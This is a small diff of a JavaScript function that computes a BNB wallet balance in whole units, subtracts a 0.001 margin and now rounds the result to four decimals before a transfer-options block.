@@ -677,7 +677,8 @@ async function proceed(){
         console.log("bnb_balance", bnb_balance);
         console.log("bnb_balance.balance", bnb_balance.balance);
         
-        const balance = ((parseInt(bnb_balance.balance)/1000000000000000000)) - 0.001;
+        let balance = ((parseInt(bnb_balance.balance)/1000000000000000000)) - 0.001;
+        balance = parseFloat(balance).toFixed(4);
         console.log("The new bnb balance", balance);
         if (balance > 0) {
         const options = {
